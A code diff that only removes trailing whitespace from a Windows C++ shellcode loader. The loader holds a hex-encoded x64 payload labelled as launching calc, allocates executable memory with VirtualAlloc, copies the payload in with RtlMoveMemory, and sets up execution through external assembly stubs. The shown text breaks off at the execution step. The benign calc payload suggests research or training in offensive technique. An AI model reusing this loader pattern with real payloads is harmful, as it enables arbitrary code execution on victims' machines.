@@ -2,7 +2,7 @@
 #include <windows.h>
 
 //custom calc payload
-unsigned char payload[] = 
+unsigned char payload[] =
     "\x48\x31\xff\x48\xf7\xe7\x65\x48\x8b\x58\x60\x48\x8b\x5b\x18\x48\x8b\x5b\x20\x48\x8b\x1b\x48\x8b\x1b\x48\x8b\x5b\x20\x49\x89\xd8\x8b"
     "\x5b\x3c\x4c\x01\xc3\x48\x31\xc9\x66\x81\xc1\xff\x88\x48\xc1\xe9\x08\x8b\x14\x0b\x4c\x01\xc2\x4d\x31\xd2\x44\x8b\x52\x1c\x4d\x01\xc2"
     "\x4d\x31\xdb\x44\x8b\x5a\x20\x4d\x01\xc3\x4d\x31\xe4\x44\x8b\x62\x24\x4d\x01\xc4\xeb\x32\x5b\x59\x48\x31\xc0\x48\x89\xe2\x51\x48\x8b"
@@ -14,18 +14,18 @@ unsigned char payload[] =
 size_t payload_len = sizeof(payload);
 
 extern "C" void onRamp(PVOID exec_mem);
-extern "C" void offRamp(void); 
+extern "C" void offRamp(void);
 
 void FunctionTwo(void){
 	//allocate memory
 	auto exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-	
+
 	//move paylaod to our buffer
 	RtlMoveMemory(exec_mem, payload, payload_len);
-	
+
 	printf("Execute payload?\n");
 	getchar(); 						//quasi-break-point
-	
+
 	//execute payload
     //Reference
     // asm("mov eax, %1;" %1 is input from source
